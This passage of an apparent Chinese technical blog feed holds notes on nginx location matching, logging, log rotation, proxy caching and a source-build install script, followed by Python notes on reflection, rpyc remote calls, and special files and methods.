mask用于指定某一路径下的文件，其路径可以是相对路径，也可以是绝对路径</code></pre><p>例子</p><pre><code># 第1 种方式： 单个个文件引入include vhost/test.conf;# 第2 种方式：利用通配符include vhost/*.conf;</code></pre><h5 id="访问控制典型应用"><a href="#访问控制典型应用" class="headerlink" title="访问控制典型应用"></a>访问控制典型应用</h5><blockquote><p>location 语法</p></blockquote><pre><code>location [= | ~ | ~* | ^~] URI {...}location @name {...}# 其中 =、~、~*、^~、@ 都是location用于实现访问控制的前缀，且在使用时只能选择一种，也可不设置前缀# URI表示URL地址中从域名到参数之间的部分，{...}表示指令块，用于满足location匹配条件后需要执行的指令</code></pre><table><thead><tr><th>前缀</th><th>说明</th></tr></thead><tbody><tr><td>=</td><td>根据其后的指定模式进行精准匹配。例如，在访问时要与 /html/aaa/index. html 完全一致才会执行其后的指令块</td></tr><tr><td>~</td><td>使用正则表达式完成location 的匹配，区分大小写</td></tr><tr><td>~*</td><td>使用正则表达式完成location 的匹配，不区分大小写</td></tr><tr><td>^~</td><td>不使用正则表达式，完成以指定模式开头的location 匹配,遵循最大前缀匹配规则</td></tr><tr><td>@</td><td>用于定义一个location 块，且该块不能被外部客户端所访问，只能被Ngin内部配置指令所访问</td></tr></tbody></table><blockquote><p>精准匹配<br>用户访问的URI与指定的URI完全一致的情况，才会执行其后的指令块</p></blockquote><pre><code class="bash">server {    listen       80;    server_name  localhost;    location =/index {        root   html;        index  index.html index.htm;        allow 192.168.12.123  # 放通该ip    }    deny all;  # 禁止所有ip访问}</code></pre><blockquote><p>正则匹配<br>多个正则location之间按照正则location在配置文件中的书写顺序进行匹配，且只要匹配成功就不会继续匹配后面定义的正则location.</p></blockquote><pre><code class="bash">server {    listen       80;    server_name  localhost;    location ~\.html$ {  # 匹配网站根目录下以. html 结尾的文件        allow all;    }    location ~^/test/.*\.html$ {  # 匹配网站根目录下test目录中以.html 结尾的文件        deny all;    }}</code></pre><blockquote><p>最大前缀匹配<br>由于location可以同时定义多个，当一个配置文件中同时出现多个location 时，普通location 之间遵循“最大前缀匹配”原则。通俗地讲就是，匹配度最高的location 将会执行，示例如下</p></blockquote><pre><code class="bash">location /test {    allow all;}location /test/log {    deny all;}</code></pre><blockquote><p>当最大前缀location与正则location同时存在时，如果正则location匹配成功，则不会执行最大前缀location</p></blockquote><pre><code class="bash">location / {  # 匹配当前网站根目录下的所有文件    allow all;}location ~\.html$ {  # 正则匹配所有以.html结尾的URI    deny all;}</code></pre><blockquote><p>location / {} 与location =/{} 的区别<br>    1. location / {} 遵守普通location 的最大前缀匹配，由于任何URI 都必然以 “/“  根开头，所以对于一个URI，若配直文件中有更合适的匹配则会将其替代，否则返回location / {}  匹配到的结果，它相当于站点默认配直。<br>    2. location =/{} 遵守的是精准匹配，也就是只能匹配改站点根目录，同时会禁止搜索正则location ，效率比location / {}要高，因此，芳在开发中能确定精准匹配的情况，可以采用 location =/{}的方式，提升匹配效率</p></blockquote><blockquote><p>禁用正则匹配<br>利用 ＝ 精准匹配或 ^~ 非正则匹配可以在正则匹配之前优先匹配，从而禁止执行原有的正则匹配</p></blockquote><pre><code class="bash">location =/test/test.html {  # 精准匹配网站根目录下的 /test/test.html    allow all;}location ^~/ {  # 非正则匹配网站根目录下的文件    deny all;}location~\.html$ {  #于正则匹配网站根目录下以.html 为结尾的文件    allow all;}</code></pre><blockquote><p>当多种类型的location 匹配同时出现时，最终执行结果为“ ＝ ”匹配优先于“ ^~ ”匹配，“ ^~  ”匹配优先于正则匹配，正则匹配优先于普通的最大前缀匹配。只要优先的location 匹配成功，就不会执行其他的location</p></blockquote><blockquote><p>location 中指定目录时 root 和 alias 区别</p></blockquote><pre><code># 当收到＂/img/itheima.png＂请求时，将请求映射为“/var/www/image/itheima.png&quot;location /img/ {    alias /var/www/image/;}# 当收到＂/img/itheima.png＂请求时，将请求映射为“/var/www/image/img/itheima.png&quot;location /img/ {    root /var/www/image;}# alias 在映射路径时不会追加location 匹配到的部分，而root 追加了location 匹配到的部分</code></pre><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><blockquote><p>访问日志<br>log_format 和 access_log. (nginx.conf中找)</p></blockquote><pre><code class="bash"># 注意  # Nginx 默认开启了访问日志的功能，且log_format 指令的配置仅可用在http块内，否则会出现警告信。# log_format可以设置多个，access_log可以设置在server块中# 设置访问日志的格式, main 表示访问日志格式名称log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;# 第1 个参数logs/access.log用于指定相对于Nginx 的安装目录/usr/local/nginx的日志文件存放路径，并包含日志文件名称# 第2 个参数表示由log_format指令定义的日志格式名称。access_log  logs/access.log  main;# buffer 参数用于设置内存缓存区的大小，flush 参数用于设置内容保存在缓存区中的最大时间# 注意：手动创建test目录，保证当前nginx进程的用户和组有对该目录的创建access.log的权限，否则无法创建access_log  logs/test/access.log  main buffer=2k flush=5s;  # 也可以这样配置# 若在访问过程中需要记录子请求的日志记录，则可以将log_subrequest指令设置为on ，否则默认不记录。log_subrequest on;# 多次访问后，可在 /usr/local/nginx/logs/access.log 中查看日志# 关闭访问日志access_log off;</code></pre><blockquote><p>日志格式相关内置变量</p></blockquote><table><thead><tr><th>内置变量</th><th>含义</th></tr></thead><tbody><tr><td>$remote_addr</td><td>客户端的IP地址</td></tr><tr><td>$remote_user</td><td>客户端用户名，用于记录浏览者进行身份验证时提供的名称，如果没有登录则为空</td></tr><tr><td>$time_local</td><td>访问的时间与时区，如21/Sep/2016:12:21:25 +0800 ，时间信息最后的+0800 表示服务器所处时区位于UTC之后的8小时</td></tr><tr><td>$request</td><td>请求的URI和HTTP协议，如GET /HTTP/l.1</td></tr><tr><td>$status</td><td>记录请求返回的HTTP状态码，如200(成功)</td></tr><tr><td>$body_bytes_sent</td><td>发送给客户端的文件主体内容的大小，如899</td></tr><tr><td>$http_referer</td><td>来路URL地址</td></tr><tr><td>$http_user_agent</td><td>客户端浏览器信息</td></tr><tr><td>$http_x_forwarded_for</td><td>客户端IP地址列表（包括中间经过的代理）</td></tr></tbody></table><h2 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h2><blockquote><p>在nginx.conf中找到error_log指令，如下</p></blockquote><pre><code class="bash"># 第1个参数，用于存放错误日志的路径# 第2个参数，用于指定错误记录详细程度的等级，默认值为error， 共有&lt;debug、info、notice、warn、error、crit&gt; 日志记录详细程度依次递减，debug最详细，crit最简洁error_log  logs/error.log;error_log  logs/error.log  notice;error_log  logs/error.log  info;# 可通过访问不存在资源测试# error_log 可以在main、http、server、location块中都可以进行设置，配置方式相同# 关闭错误日志error_log /dev/null;</code></pre><h2 id="日志文件切割"><a href="#日志文件切割" class="headerlink" title="日志文件切割"></a>日志文件切割</h2><blockquote><p>手动<br>手动备份文件后，使用 nginx -s reopen 重新生成日志文件即可</p></blockquote><blockquote><p>自动，定时执行脚本（供参考，根据实际需求）</p></blockquote><pre><code class="bash"># file_name: cut_log.sh# path: /usr/local/nginx/logs/test/cut_log.sh#!/bin/bash#当前Nginx日志文件存放目录logs_path=&quot;/usr/local/nginx/logs/test&quot;#备份日志文件mv $logs_path/access.log $logs_path/ `date -d yesterday +&quot;%Y%m%d&quot;`.log#重新打开Nginx日志/usr/local/nginx/sbin/nginx -s reopen</code></pre><pre><code class="bash"># 添加权限chmod +x cut_log.sh#定时任务crontab -e#写入，每天0点备份0 0 * * * /usr/local/nginx/logs/test/cut_log.sh &gt; /dev/null 2＞&amp;1# 每分钟执行一次* * * * * /usr/local/nginx/logs/test/cut_log.sh &gt; /dev/null 2＞&amp;1# /dev/null 2＞&amp;1 指令用于屏蔽标准输出和标准出错的信息</code></pre><h2 id="缓存配置"><a href="#缓存配置" class="headerlink" title="缓存配置"></a>缓存配置</h2><h4 id="临时缓存配置"><a href="#临时缓存配置" class="headerlink" title="临时缓存配置"></a>临时缓存配置</h4><p>添加如下内容</p><pre><code># 代理临时目录proxy_temp_path /usr/local/nginx/proxy_temp_dir;# web缓存目录和参数设置proxy_cache_path /usr/local/nginx/proxy_cache_dir levels=1:2 keys_zone=cache_one:50m inactive=1m max_size=500m;</code></pre><ul><li>/usr/local/nginx/proxy_cache_dir 参数：表示用户自定义的缓存文件保存目录</li><li>levels 参数：表示缓存目录下的层级目录结构，它是根据哈希后的请求URL 地址创建的，目录名称从晗希后的字符串结尾处开始截取。<br>(假设哈希后的请求链接地址为af7098al5e430326l97ee015l6fdace0 ，则levels = 1: 2表示，第1 层子目录的名称是长度为1 的字符0 ，第2 层子目录的名称是长度为2 的字符ce,)</li><li>keys_zone 参数：指定缓存区名称及大小，例如， cache_one: 50 m 表示缓存区名称为cache_one ，在内存中的空间是50MB</li><li>inactive 参数：表示主动清空在指定时间内未被访问的缓存。例如， lm 清空在1 分钟内未被访问过的缓存， lh 表示1 小时， ld 表示1 天等</li><li>max_size 参数：表示指定磁盘空间大小。例如， 500m,10g</li></ul><blockquote><p>注意<br>Nginx 在进行缓存时，首先会被写人proxy_temp_path 指定的临时目录中，因此建议proxy_ cache_path 和proxy_temp_path 指令设置的目录应在同一个文件系统中，避免不同文件系统之间的磁盘I/ 0 消耗。</p></blockquote><pre><code class="bash">http {    # 代理临时目录,当上游服务器的响应过大不能存储到配置的缓冲区域时，Nginx存储临时文件硬盘路径。    proxy_temp_path proxy_temp_dir;    # web缓存目录和参数设置    proxy_cache_path proxy_cache_dir levels=1:2 keys_zone=cache_one:50m inactive=1m max_size=500m;    server {        listen 80 ;        server_name www.test.com;        #增加两个响应头信息，用于获知访问的服务帮地址与缓存是有成功        add_header X-Via $server_addr;  # 表示服务器地址        add_header X-Cache $upstream_cache_status;  # 表示资源缓存状态         location / {            #设置缓存区域名称            proxy_cache cache_one ;            #以域名、URI、参数组合成Web 缓存的Key值， Nginx 根据Key 值哈希            proxy_cache_key $host$uri$is_args$args;            #对不同的HTTP 状态码设置不同的缓存时间            proxy_cache_valid 200 10m;  #200缓存10分钟            proxy_cache_valid 304 1m;  #304缓存1分钟            proxy_cache_valid 301 302 1h;  #301 302缓存1小时            proxy_cache_valid any 1m;  #其他未设置的状态码缓存1分钟            # 设置反向代理            proxy_pass http://10.240.171.42:8007;        }    }}</code></pre><p>proxy_cache_key 指令参数中使用的具体内置变量的说明如下。</p><ul><li>$host ： 服务器的域名，如<a href="http://www.test.com。" target="_blank" rel="noopener">www.test.com。</a></li><li>$uri ：域名和参数之间的部分，如/index.html 。</li><li>$is_args ： 有URL 参数时，则值为？，否则为空字符串。</li><li>$args ： 保存URL 参数，如a=l&amp;b=2 ，没有参数时为空字符串。</li><li>利用$is_args 和$args ，可以实现根据不同URL 参数缓存不同文件。</li></ul><p> $upstream_cache_status的返回值如下</p><table><thead><tr><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td>HIT</td><td>缓存命中</td></tr><tr><td>MISS</td><td>未命中，请求被传送到后端</td></tr><tr><td>EXPIRED</td><td>缓存已经过期，请求被传送到后端</td></tr><tr><td>UPDATING</td><td>正在更新缓存，将使用旧的应答</td></tr><tr><td>STALE</td><td>无法从后端服务器更新缓存时，返回了旧的缓存内容（可通过proxy_cache_use_stale指令配置）</td></tr><tr><td>BYPASS</td><td>缓存被绕过了（可通过proxy_cache_bypass 指令配置）</td></tr><tr><td>REV ALIDA TED</td><td>启用proxy_cache_revalidate 指令后，当缓存内容过期时， Nginx 通过一次If-Modified-Since 的请求头去验证缓存内容是否过期，此时会返回该状态</td></tr></tbody></table><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>proxy_cache_bypass</td><td>用于配置Nginx 向客户端发送响应数据时，不从缓存中获取的条件</td></tr><tr><td>proxy_cache_lock</td><td>用于设置是否开启缓存的锁功能</td></tr><tr><td>proxy_cache_lock_timeout</td><td>用于设置缓存的锁功能开启以后锁的超时时间</td></tr><tr><td>proxy_no_cache</td><td>配置在什么情况下不使用缓存功能</td></tr><tr><td>proxy_cache_min_uses</td><td>当同一个URL 被重复请求达到指定的次数后，才对该URL 进行缓存</td></tr><tr><td>proxy_cache_revalidate</td><td>用于当缓存内容过期时， Nginx 通过一次If-Modified-Since 的请求头去验证缓存内容是否过期</td></tr><tr><td>proxy_cache_use_stale</td><td>设置状态，用于内容源Web 服务器处于这些状态时， Nginx 向客户端响应历史缓存数据</td></tr></tbody></table><p>安装脚本（阿里云ubuntu）</p><pre><code>#!/bin/bashapt updatewget http://nginx.org/download/nginx-1.14.2.tar.gztar -zxvf nginx-1.14.2.tar.gz#安装nginx依赖包# centos使用下面这句# echo y | apt install pcre-devel zlib-devel openssl-dlevel# ubuntu使用下面这句echo y | apt install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-devcd nginx-1.14.2/./configure --prefix=/usr/local/nginx --with-http_ssl_modulemake &amp;&amp; make install# 创建软链接ln -s /usr/local/nginx/sbin/nginx /usr/local//sbin/nginx# n写入ginx.service文件echo &#39;#!/bin/bash### BEGIN INIT INFO# Provides:          zhuzhenyuan.cn# Required-Start:    $local_fs $network# Required-Stop:     $local_fs# Default-Start:     2 3 4 5# Default-Stop:      0 1 6# Short-Description: nginix service# Description:       nginix service daemon### END INIT INFO# LSB tags规范，上面这段内容有，就可以支持 systemctl enable nginx.service，或者直接 apt-get remove insservDAEMON=/usr/local/nginx/sbin/nginxcase &quot;$1&quot; in    start)        echo &quot;Starting nginx daemon...&quot;        $DAEMON &amp;&amp; echo &quot;NGINX RUN SUCCESS&quot;        ;;    stop)        echo &quot;Stopping nginx daemon...&quot;        $DAEMON -s stop &amp;&amp; echo &quot;NGINX STOP SUCCESS&quot;    ;;    quit)        echo &quot;Stopping nginx daemon...&quot;        $DAEMON -s quit &amp;&amp; echo &quot;NGINX QUIT SUCCESS&quot;    ;;    reload)        echo &quot;Reloading nginx daemon...&quot;        $DAEMON -s reload &amp;&amp; echo &quot;NGINX RELOAD SUCCESS&quot;    ;;    restart)        echo &quot;Restarting nginx daemon...&quot;        $DAEMON -s quit        $DAEMON &amp;&amp; echo &quot;RESTARTING NGINX SUCCESS&quot;    ;;    *)        echo &quot;Usage: dervice nginx{start|stop|quit|restart|reload}&quot;        exit 2    ;;esac&#39; &gt; /etc/init.d/nginx# 添加权限chmod u+x /etc/init.d/nginx# unmask：取消对 unit 的注销。 systemctl unmask nginx.servicenginx</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 反射.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%8F%8D%E5%B0%84/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<p>例子</p><pre><code class="python">#encoding=utf-8&#39;&#39;&#39;Created on 2013-08-29@author: Martine&#39;&#39;&#39;class Test(object):    def __init__(self):        self.name = &#39;tesname&#39;    def foo(self,name):        self.name = nameif __name__ == &quot;__main__&quot;:#     print &#39;this is my first python ...&#39;    eval_test = eval(&#39;Test()&#39;)    print eval_test    print &#39;old name is :%s &#39; % eval_test.name    func = getattr(eval_test, &#39;foo&#39;)    print func    func(&#39;new_name&#39;)    print &#39;new name is :%s &#39; % eval_test.name</code></pre><p>例子</p><pre><code class="python">#dynamic.pyimp = input(&quot;请输入模块:&quot;)dd = __import__(imp)# 等价于import impinp_func = input(&quot;请输入要执行的函数：&quot;)f = getattr(dd,inp_func，None)#作用:从导入模块中找到你需要调用的函数inp_func,然后返回一个该函数的引用.没有找到就烦会Nonef() # 执行该函数</code></pre><p>介绍四个内置函数:</p><pre><code class="python">1. getattr()函数是Python自省的核心函数，具体使用大体如下：class A: def __init__(self): self.name = &#39;zhangjing&#39;#self.age=&#39;24&#39;def method(self): print&quot;method print&quot;Instance = A() print getattr(Instance , &#39;name, &#39;not find&#39;) #如果Instance 对象中有属性name则打印self.name的值，否则打印&#39;not find&#39;print getattr(Instance , &#39;age&#39;, &#39;not find&#39;) #如果Instance 对象中有属性age则打印self.age的值，否则打印&#39;not find&#39;print getattr(a, &#39;method&#39;, &#39;default&#39;) #如果有方法method，否则打印其地址，否则打印default print getattr(a, &#39;method&#39;, &#39;default&#39;)() #如果有方法method，运行函数并打印None否则打印default 2. hasattr(object, name)说明：判断对象object是否包含名为name的特性（hasattr是通过调用getattr(ojbect, name)是否抛出异常来实现的）3. setattr(object, name, value)这是相对应的getattr()。参数是一个对象,一个字符串和一个任意值。字符串可能会列出一个现有的属性或一个新的属性。这个函数将值赋给属性的。该对象允许它提供。例如,setattr(x,“foobar”,123)相当于x.foobar = 123。4. delattr(object, name)与setattr()相关的一组函数。参数是由一个对象(记住python中一切皆是对象)和一个字符串组成的。string参数必须是对象属性名之一。该函数删除该obj的一个由string指定的属性。delattr(x, &#39;foobar&#39;)=del x.foobar</code></pre><p>基于反射机制模拟web框架路由</p><p>　　需求：比如我们输入:<a href="http://www.xxx.com/commons/f1，返回f1的结果。" target="_blank" rel="noopener">www.xxx.com/commons/f1，返回f1的结果。</a></p><pre><code class="python"># 动态导入模块，并执行其中函数url = input(&quot;url: &quot;)target_module, target_func = url.split(&#39;/&#39;)m = __import__(&#39;lib.&#39;+target_module, fromlist=True)inp = url.split(&quot;/&quot;)[-1]  # 分割url,并取出url最后一个字符串if hasattr(m,target_func):  # 判断在commons模块中是否存在inp这个字符串    target_func = getattr(m,target_func)  # 获取inp的引用    target_func()  # 执行else:    print(&quot;404&quot;)</code></pre><p>python中反射4种方法的基本使用</p><pre><code class="python">class Foo(object):    def __init__(self):        self.name = &quot;laozhang&quot;    def func(self):        return &quot;hello python&quot;obj = Foo()#判断ｏｂｊ中是否有第二个参数#如果第二个只是属性，则返回属性值，如果是方法名，则返回方法的内存地址，如果第二个参数没有在对象中找到，程序崩溃# res = getattr(obj,&quot;name１&quot;) #程序崩溃# res = getattr(obj,&quot;name&quot;) #返回属性值 并同时可省略r = res()res = getattr(obj,&quot;func&quot;) #res为ｆｕｎｃ的内存地址r = res()print(r)#检查ｏｂｊ中是否存在func成员,当找到第二个参数时返回ｔｒｕｅ，否则返回ｆａｌｓｅres = hasattr(obj,&quot;func&quot;)print(res)print(obj.name) #查看之前obj的ｎａｍｅ#设置obj中ｎａｍｅ为laowangres = setattr(obj,&quot;name&quot;,&quot;laowang&quot;)print(obj.name)#当设置的值不存在时，会自动添加到实例对象中#setattr需要三个参数: x,y,z　==&gt; x.y =z#相当于obj.age = 10setattr(obj,&quot;age&quot;,&quot;10&quot;)print(&quot;name=%s,age=%s&quot;%(obj.name,obj.age))  #laowang 10#删除对象的属性delattr(obj,&quot;age&quot;)print(&quot;name=%s,age=%s&quot;%(obj.name,obj.age))  #程序崩溃</code></pre><p>Python：import 与<strong>import</strong>()</p><p>参考： <a href="https://www.cnblogs.com/f1194361820/p/9675960.html" target="_blank" rel="noopener">https://www.cnblogs.com/f1194361820/p/9675960.html</a></p><pre><code>首先来说一下两者的区别：　　import指令做了两件事：1）搜索module，2）绑定到局部变量　　内置函数__import__()只做了一件事：搜索module　　import指令执行过程中是调用__import__()来完成Module检索的。</code></pre><p>python 动态导入模块 importlib.import_module</p><p><a href="https://blog.csdn.net/tumi678/article/details/80514028" target="_blank" rel="noopener">https://blog.csdn.net/tumi678/article/details/80514028</a></p><blockquote><p>作为python标准库提供，提供python import语法和(<strong>import</strong>()函数)的实现，另外importlib提供了开发者可以创建自己的对象(即importer)来处理导入过程</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py rpyc.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20rpyc/"/>
      <url>/2019/12/02/deploy/python/libs/py%20rpyc/</url>
      
        <content type="html"><![CDATA[<p>官方文档： <a href="https://rpyc.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://rpyc.readthedocs.io/en/latest/</a><br><a href="https://rpyc.readthedocs.io/en/latest/tutorial.html" target="_blank" rel="noopener">https://rpyc.readthedocs.io/en/latest/tutorial.html</a></p><p>使用场景： 一种是调用远端的模块，另外一种是调用远端的函数</p><h6 id="server"><a href="#server" class="headerlink" title="server"></a>server</h6><pre><code class="python">#!/usr/bin/env python# -*- encoding: utf-8 -*-import timefrom rpyc import Servicefrom rpyc.utils.server import ThreadedServerclass TimeService(Service):    def on_connect(self, *args, **kwargs):        # code that runs when a connection is created        # (to init the serivce, if needed)        print(&quot;on connect&quot;)        pass    def on_disconnect(self, *args, **kwargs):        # code that runs when the connection has already closed        # (to finalize the service, if needed)        print(&quot;on disconnect&quot;)        pass        # 对于服务端来说， 只有以&quot;exposed_&quot;打头的方法才能被客户端调用，所以要提供给客户端的方法都得加&quot;exposed_&quot;    def exposed_get_time(self):        return time.ctime()  # time模块中的一个内置方法    def exposed_change_text(self, s):        return &quot;test+&quot; + ss = ThreadedServer(service=TimeService, port=12233, auto_register=False)s.start()</code></pre><h6 id="client"><a href="#client" class="headerlink" title="client"></a>client</h6><pre><code class="python">#!/usr/bin/env python# -*- encoding: utf-8 -*-import rpycconn = rpyc.connect(&#39;localhost&#39;,12233)#调用服务器端的方法，格式为：conn.root.xxx。xxx代表服务器端的方法名# get_time是服务端的那个以&quot;exposed_&quot;开头的方法result = conn.root.get_time()print(result)print(conn.root.change_text(&#39;ggggggggggggggg&#39;))conn.close()</code></pre><ol><li>Client一定要 close()连接</li><li>Server中exposed_打头的函数才能被 客户端调用。所以如果写服务端代码的时候想要让客户端调用 就要加这一个前缀。</li><li>client要访问服 务器端代码通过c.root.xxx才能访问，如：c.root.get_time() 调用服务器端get_time方法</li><li>RPYC没有认证机制，任何客 户端都可以直接访问服务器端的暴露的方法</li><li>如果cResult是其它类型的数据的话， 你conn.close()之后，cResult就为空的了(这是因为对于其它类型的返回值，服务端返回的是rpyc.netref的封装nobj， 当访问nobj时，它连接到服务端，取值，并返回给客户端，你close之后就连不到服务端了)，所以最好在服务端把计算结果处理下，转换成数字或字符串(对于大字典来说，可以用json转换下，然后客户端再转过来就ok了)</li></ol><p>跨服务器调用方案：</p><p>gRPC<br><a href="https://blog.csdn.net/zhj_fly/article/details/82684970" target="_blank" rel="noopener">java和python使用grpc交互 - zhj_fly的博客 - CSDN博客</a><br><a href="https://doc.oschina.net/grpc?t=58008" target="_blank" rel="noopener">gRPC 官方文档中文版_V1.0</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 特殊文件.md</title>
      <link href="/2019/12/02/deploy/python/built-in/py%20%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/"/>
      <url>/2019/12/02/deploy/python/built-in/py%20%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="main-文件"><a href="#main-文件" class="headerlink" title="__main__文件"></a>__main__文件</h1><blockquote><p>‘<strong>main</strong>‘ 是顶层代码执行的作用域的名称。模块的 <strong>name</strong> 在通过标准输入、脚本文件或是交互式命令读入的时候会等于 ‘<strong>main</strong>‘。</p></blockquote><blockquote><p>模块可以通过检查自己的 <strong>name</strong> 来得知是否运行在 main 作用域中，这使得模块可以在作为脚本或是通过 python -m 运行时条件性地执行一些代码，而在被 import 时不会执行。</p></blockquote><blockquote><p>当通过python -m package 语句执行时，python 会先执行 <strong>init</strong>.py ，然后执行<strong>main</strong>.py</p></blockquote><pre><code>if __name__ == &quot;__main__&quot;:    # execute only if run as a script    main()</code></pre><blockquote><p><strong>对软件包来说，通过加入 <strong>main</strong>.py 模块可以达到同样的效果，当使用 -m 运行模块时，其中的代码会被执行。</strong></p></blockquote><h1 id="init-文件"><a href="#init-文件" class="headerlink" title="__init__文件"></a>__init__文件</h1><blockquote><p>在导入一个包时，实际上是导入了它的<strong>init</strong>.py文件。这样我们可以在<strong>init</strong>.py文件中批量导入我们所需要的模块，而不再需要一个一个的导入</p></blockquote><pre><code># package# __init__.pyimport reimport urllibimport sysimport os# a.pyimport packageprint(package.re, package.urllib, package.sys, package.os)</code></pre><blockquote><p>init.py中还有一个重要的变量，all, 它用来将模块全部导入</p></blockquote><blockquote><p>当使用 from package import *语句时，主程序只能获得<strong>all</strong>中的属性</p></blockquote><blockquote><p>如果想在<strong>all</strong>列表中填写下几级的包（或者模块、模块中的属性），需要先在<strong>init</strong>.py将该包（或者模块、模块中的属性）导入才能使用</p></blockquote><blockquote><p>如果没有定义<strong>all</strong>，通过 from package import * 语句导入时，主程序可以获得在<strong>init</strong>.py定义的属性</p></blockquote><pre><code># __init__.py__all__ = [&#39;os&#39;, &#39;sys&#39;, &#39;re&#39;, &#39;urllib&#39;]# a.pyfrom package import *</code></pre><blockquote><p>可以被import语句导入的对象是以下类型：</p></blockquote><ul><li>模块文件（.py文件）</li><li>C或C++扩展（已编译为共享库或DLL文件）</li><li>包（包含多个模块）</li><li>内建模块（使用C编写并已链接到Python解释器中）</li></ul><blockquote><p>关于.pyc 文件 与 .pyo 文件<br>py文件的汇编,只有在import语句执行时进行，当.py文件第一次被导入时，它会被汇编为字节代码，并将字节码写入同名的.pyc文件中。后来每次导入操作都会直接执行.pyc 文件（当.py文件的修改时间发生改变，这样会生成新的.pyc文件），在解释器使用-O选项时，将使用同名的.pyo文件，这个文件去掉了断言（assert）、断行号以及其他调试信息，体积更小，运行更快。（使用-OO选项，生成的.pyo文件会忽略文档信息）</p></blockquote><blockquote><p>导入模块  </p></blockquote><p>模块通常为单独的.py文件，可以用import直接引用，可以作为模块的文件类型有.py、.pyo、.pyc、.pyd、.so、.dll</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 特殊函数.md</title>
      <link href="/2019/12/02/deploy/python/built-in/py%20%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0/"/>
      <url>/2019/12/02/deploy/python/built-in/py%20%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="left">方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">__file__</td><td align="left">当前路径</td></tr><tr><td align="left">__doc__</td><td align="left">描述类信息</td></tr><tr><td align="left">__repr__／<strong>str</strong></td><td align="left">打印／转换 print(X)、repr(X)／str(X)</td></tr><tr><td align="left">__module__</td><td align="left">该函数所属模块的名称，没有则为 None</td></tr><tr><td align="left">__name__</td><td align="left">如果当前模块为顶层模块执行 则打印<strong>main</strong>，作为被调用模块的时候打印当前模块的名称</td></tr><tr><td align="left">__class__</td><td align="left">表示当前操作的对象的类是什么</td></tr><tr><td align="left">__init__</td><td align="left">构造方法，通过类创建对象时，自动触发执行</td></tr><tr><td align="left">__del__</td><td align="left">析构方法，当对象在内存中被释放时，自动触发执行</td></tr><tr><td align="left">__call__</td><td align="left">所有的函数都是可调用对象。一个类实例也可以变成一个可调用对象，让调用更简单</td></tr><tr><td align="left">__dict__</td><td align="left">查看类或对象中的所有成员</td></tr><tr><td align="left">__slots__</td><td align="left">可以限制 class的属性</td></tr><tr><td align="left">__getattr__</td><td align="left">当访问object不存在的属性时会调用该方法</td></tr><tr><td align="left">__setattr__</td><td align="left">当设置类实例属性时自动调用，如j.name=5 就会调用<strong>setattr</strong>方法</td></tr><tr><td align="left">__delattr__</td><td align="left">当删除类实例属性时自动调用，如del X.any 就会调用<strong>delattr</strong>方法</td></tr><tr><td align="left">__getattribute__</td><td align="left">属性获取，当每次调用属性时，python会无条件进入<strong>getattribute</strong>中，不论属性存在与否</td></tr><tr><td align="left">__add__</td><td align="left">运算符+</td></tr><tr><td align="left">__sub__</td><td align="left">运算符-</td></tr><tr><td align="left">__or__</td><td align="left">运算符</td></tr><tr><td align="left">__iter__, <strong>next</strong></td><td align="left">迭代 I=iter(X), next()</td></tr><tr><td align="left">__getitem__</td><td align="left">用于索引操作，如字典。表示获取数据X[key]，X[i:j]</td></tr><tr><td align="left">__setitem__</td><td align="left">用于索引操作，如字典。表示设置数据X[key]，X[i:j]=sequence</td></tr><tr><td align="left">__delitem__</td><td align="left">用于索引操作，如字典。表示删除数据del X[key]，del X[i:j]</td></tr><tr><td align="left">__get__</td><td align="left">属性描述符的原理利用的是抽象的方法, X.attr</td></tr><tr><td align="left">__get__</td><td align="left">属性描述符的原理利用的是抽象的方法,  X.attr=value</td></tr><tr><td align="left">__delete__</td><td align="left">属性描述符的原理利用的是抽象的方法,    del X.attr</td></tr><tr><td align="left">__new__</td><td align="left">new:是用来创建实例的，对类实例化之前进行定制，在<strong>init</strong>之前创建对象</td></tr><tr><td align="left">__metaclass__</td><td align="left">metaclass：定义一个类如何被创建</td></tr><tr><td align="left">__len__</td><td align="left">长度len(X)</td></tr><tr><td align="left">__bool__</td><td align="left">布尔测试bool(X)</td></tr><tr><td align="left">__lt__</td><td align="left">X&lt;Y</td></tr><tr><td align="left">__gt__</td><td align="left">X&gt;Y</td></tr><tr><td align="left">__le__</td><td align="left">X&lt;=Y</td></tr><tr><td align="left">__ge__</td><td align="left">X&gt;=Y</td></tr><tr><td align="left">__eq__</td><td align="left">X==Y</td></tr><tr><td align="left">__ne__</td><td align="left">X!=Y</td></tr><tr><td align="left">__radd__</td><td align="left">右侧加法 other+X</td></tr><tr><td align="left">__iadd__</td><td align="left">实地（增强的）加法X+=Y(or else __add__)</td></tr><tr><td align="left">__contains__</td><td align="left">成员关系测试item in X(X为任何可迭代对象)</td></tr><tr><td align="left">__index__</td><td align="left">整数值hex(X), bin(X),  oct(X)</td></tr><tr><td align="left">__enter__, 